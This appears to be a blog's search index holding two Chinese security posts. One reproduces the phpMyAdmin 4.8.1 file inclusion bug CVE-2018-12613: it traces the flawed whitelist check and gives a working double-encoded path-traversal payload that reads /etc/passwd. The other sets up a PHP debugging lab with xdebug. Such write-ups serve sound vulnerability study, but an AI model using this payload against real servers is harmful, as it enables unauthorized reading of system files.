<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>phpmyadmin 4.8.1 远程文件包含漏洞(CVE-2018-12613)</title>
      <link href="/2019/11/19/phpmyadmin-4-8-1-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613/"/>
      <url>/2019/11/19/phpmyadmin-4-8-1-%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-CVE-2018-12613/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>mac + php5.6 + apache + mysql5.5 + xdebug-2.5.5</p><p>phpmyadmin 4.8.1 下载链接： </p><ul><li><a href="https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip" target="_blank" rel="noopener">https://files.phpmyadmin.net/phpMyAdmin/4.8.1/phpMyAdmin-4.8.1-all-languages.zip</a></li></ul><p><strong>确保 mysql 启动无误。</strong></p><p>下载并移动 phpmyadmin 源代码到本地 web 根目录中，修改配置文件：</p><pre><code class="bash">cp config.sample.inc.php config.inc.php</code></pre><p>修改 <code>config.inc.php</code> 文件：</p><p><img src="../../../../img/phpmyadmin1.png" alt=""></p><p>安装完成。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h3><p>index.php ：55 行左右</p><pre><code class="php">if (! empty($_REQUEST[&#39;target&#39;])    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])    &amp;&amp; ! preg_match(&#39;/^index/&#39;, $_REQUEST[&#39;target&#39;])    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])) {    include $_REQUEST[&#39;target&#39;];    exit;}</code></pre><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>通过 get 方式传入的 target 参数，有可能进入 include 函数，从而导致任意文件包含。 但是要经过上述几个判断，简单梳理一下 target 需要满足的条件：</p><ol><li>参数不为空，且是 string 类型</li><li>不能以 index 开头</li><li>不能在黑名单中（import.php exprot.php）</li><li>通过 <code>Core::checkPageValidity</code> 方法的判断</li></ol><p>跟进 <code>Core::checkPageValidity</code>：</p><pre><code>public static function checkPageValidity(&amp;$page, array $whitelist = []){    if (empty($whitelist)) {        $whitelist = self::$goto_whitelist;    }    if (! isset($page) || !is_string($page)) {        return false;    }    if (in_array($page, $whitelist)) {        return true;    }    $_page = mb_substr(        $page,        0,        mb_strpos($page . &#39;?&#39;, &#39;?&#39;)    );    if (in_array($_page, $whitelist)) {        return true;    }    $_page = urldecode($page);    $_page = mb_substr(        $_page,        0,        mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)    );    if (in_array($_page, $whitelist)) {        return true;    }    return false;}</code></pre><p>不管哪一种情况，都要求 page 参数满足 isset 和 is_string 。这是肯定满足的，我们主要梳理一下这一段代码对 page 参数的其他要求：</p><ol><li>首先获取一个白名单</li><li>page 参数在白名单中</li><li>page 参数截取第一个 <code>?</code> 前的子串，子串在白名单中</li><li>page 参数先 url 解码后，再截取第一个 <code>?</code> 前的子串，子串在白名单中</li></ol><p>梳理下攻击思路：</p><ol><li>白名单是已知的，这里随便选一个 db_datadict.php 。</li><li>既然我们走到了 include 这里，那就尽可能让传进来的参数，任意满足上面一种情况，并且仍然可以通过目录穿越，包含到任意文件。<br><img src="../../../../img/phpmyadmin2.jpg" alt=""></li></ol><h3 id="Payload："><a href="#Payload：" class="headerlink" title="Payload："></a>Payload：</h3><pre><code class="php">/index.php?target=db_datadict.php%253f/../../../../../../../../../etc/passwd</code></pre><p>该 payload 使得 page 参数满足最后一种条件，也就是 url 解码后，截取第一个问号 <code>?</code> 之前的子串，子串（db_datadict.php）在白名单中。</p><p><img src="../../../../img/phpmyadmin3.png" alt=""></p><p><img src="../../../../img/phpmyadmin4.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
          <category> 漏洞复现 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP代码审计环境搭建</title>
      <link href="/2019/11/17/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2019/11/17/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="mac-lamp-xdebug"><a href="#mac-lamp-xdebug" class="headerlink" title="mac lamp + xdebug"></a>mac lamp + xdebug</h1><h2 id="install-required-libraries"><a href="#install-required-libraries" class="headerlink" title="install required libraries"></a>install required libraries</h2><pre><code class="angular2html">brew install openldap libiconv</code></pre><h2 id="apache2"><a href="#apache2" class="headerlink" title="apache2"></a>apache2</h2><pre><code class="angular2html">sudo apachectl stopsudo launchctl unload -w /System/Library/LaunchDaemons/org.apache.httpd.plist 2&gt;/dev/nullbrew install httpdsudo brew services start httpd</code></pre><h2 id="Multiple-Versions-PHP"><a href="#Multiple-Versions-PHP" class="headerlink" title="Multiple Versions PHP"></a>Multiple Versions PHP</h2><pre><code class="angular2html">brew tap exolnet/homebrew-deprecatedbrew install php@5.6brew install php@7.0brew install php@7.1brew install php@7.2brew install php@7.3</code></pre><h2 id="PHP-Switcher-Script-sphp"><a href="#PHP-Switcher-Script-sphp" class="headerlink" title="PHP Switcher Script (sphp)"></a>PHP Switcher Script (sphp)</h2><pre><code class="angular2html">curl -L https://gist.githubusercontent.com/rhukster/f4c04f1bf59e0b74e335ee5d186a98e2/raw &gt; /usr/local/bin/sphpchmod +x /usr/local/bin/sphp</code></pre><p>example:</p><pre><code class="angular2html">Switching to php@7.1Switching your shellUnlinking /usr/local/Cellar/php@5.6/5.6.40... 319 symlinks removedUnlinking /usr/local/Cellar/php@7.0/7.0.33... 0 symlinks removedUnlinking /usr/local/Cellar/php@7.1/7.1.32_1... 0 symlinks removedUnlinking /usr/local/Cellar/php@7.2/7.2.23... 0 symlinks removedUnlinking /usr/local/Cellar/php/7.3.10... 208 symlinks removedLinking /usr/local/Cellar/php@7.1/7.1.32_1... 25 symlinks createdIf you need to have this software first in your PATH instead consider running:  echo &#39;export PATH=&quot;/usr/local/opt/php@7.1/bin:$PATH&quot;&#39; &gt;&gt; ~/.zshrc  echo &#39;export PATH=&quot;/usr/local/opt/php@7.1/sbin:$PATH&quot;&#39; &gt;&gt; ~/.zshrcYou will need sudo power from now onSwitching your apache confRestarting apachePHP 7.1.32 (cli) (built: Oct  6 2019 20:44:48) ( NTS )Copyright (c) 1997-2018 The PHP GroupZend Engine v3.1.0, Copyright (c) 1998-2018 Zend Technologies    with Zend OPcache v7.1.32, Copyright (c) 1999-2018, by Zend TechnologiesAll done!</code></pre><p>切换为 php 5.6 ：<br><img src="../../../../img/2.jpg" alt=""></p><h2 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h2><pre><code class="angular2html">pecl install xdebug</code></pre><p>随后在 vscode 或者 phpstorm 中配置 xdebug 即可。</p><h3 id="vscode-安装-xdebug-："><a href="#vscode-安装-xdebug-：" class="headerlink" title="vscode 安装 xdebug ："></a>vscode 安装 xdebug ：</h3><p>比较简单，直接安装 vscode 插件 phpdebug 即可，也不需要特别多的配置。</p><p><img src="../../../../img/3.jpg" alt=""><br><img src="../../../../img/4.jpg" alt=""></p><h3 id="phpstorm-安装-xdebug-："><a href="#phpstorm-安装-xdebug-：" class="headerlink" title="phpstorm 安装 xdebug ："></a>phpstorm 安装 xdebug ：</h3><p>相对复杂一点：</p><p><img src="../../../../img/5.png" alt=""><br><img src="../../../../img/6.png" alt=""><br><img src="../../../../img/7.png" alt=""></p><p>然后就可以开始尽情的代码审计了。<br><strong>没有断点，不用动态调试的代码审计，等于白给。</strong></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://getgrav.org/blog/macos-mojave-apache-multiple-php-versions" target="_blank" rel="noopener">https://getgrav.org/blog/macos-mojave-apache-multiple-php-versions</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
          <category> 漏洞复现 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
